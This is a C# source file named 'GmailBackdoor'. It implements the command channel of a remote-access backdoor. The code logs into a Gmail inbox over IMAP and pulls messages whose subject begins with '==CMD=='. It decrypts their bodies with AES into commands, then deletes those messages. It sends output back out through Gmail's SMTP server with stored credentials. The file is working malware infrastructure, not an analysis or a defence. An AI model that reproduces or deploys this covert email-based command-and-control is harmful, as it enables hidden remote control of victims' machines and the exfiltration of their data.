using ActiveUp.Net.Mail;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace GmailBackdoor
{
    class Email
    {
        private static bool _isCheckingEmail;

        public static List<string> CheckServerEmail()
        {
            if (_isCheckingEmail)
            {
                return new List<string>();
            }

            _isCheckingEmail = true;
            var messages = new List<string>();
            var deleteIds = new List<int>();

            try
            {
                using (var _clientImap4 = new Imap4Client())
                {
                    _clientImap4.ConnectSsl(SettingsManager.Get.ImapServer, SettingsManager.Get.ImapPort);

                    _clientImap4.Login(SettingsManager.Get.ServerEmailAddress, SettingsManager.Get.ServerPassword);
                    //_clientImap4.LoginFast(_imapLogin, _imapPassword);

                    var _mailBox = _clientImap4.SelectMailbox("INBOX");

                    foreach (var messageId in _mailBox.Search("ALL").AsEnumerable())
                    {
                        // ==CMD== is the standard AES encrypted command.
                        // ==S_CMD== is a "simple" command that is not encrtyped.
                        // ==D_CMD== is a test command and will only be read/parsed if this is a debug build.
                        try
                        {
                            var message = _mailBox.Fetch.Message(messageId);
                            var _imapMessage = Parser.ParseMessage(message);
                            if (_imapMessage.BodyText == null || _imapMessage.Subject == null)
                            {
                                break;
                            }

                            if (_imapMessage.Subject.StartsWith("==CMD=="))
                            {
                                var crypted = _imapMessage.BodyText.Text;
                                var msg = Utilities.DecryptStringAES(crypted, SettingsManager.Get.EncrptKey);
                                messages.Add(msg);
                                deleteIds.Add(messageId);
                            }
                        }
                        catch (Exception ex)
                        {
                            throw ex;
                        }
                    }

                    // Delete messages
                    foreach (var id in deleteIds)
                    {
                        _mailBox.DeleteMessage(id, expunge: false);
                    }

                    _clientImap4.Disconnect();
                }
            }
            catch (Imap4Exception)
            {
                // Failed to log in, it happens sometimes.
            }
            catch (Exception ex)
            {
                throw ex;
            }
            _isCheckingEmail = false;
            return messages;
        }

        public static new bool SendMail(string subject, string body)
        {
            try
            {
                var mail = new MailMessage();
                mail.From = new MailAddress(SettingsManager.Get.SenderEmailAddress);
                mail.To.Add(SettingsManager.Get.ServerEmailAddress);
                mail.Subject = subject;
                mail.Body = body;

                CreateSmtpClient().Send(mail);
            }
            catch (Exception ex)
            {
                throw ex;
            }
            return true;
        }

        protected static SmtpClient CreateSmtpClient()
        {
            var SmtpServer = new SmtpClient("smtp.gmail.com");
            SmtpServer.Port = 587;
            SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
            SmtpServer.UseDefaultCredentials = true;
            SmtpServer.Credentials = new System.Net.NetworkCredential(SettingsManager.Get.SenderEmailAddress, SettingsManager.Get.SenderPassword);
            SmtpServer.EnableSsl = true;

            return SmtpServer;
        }
    }
}
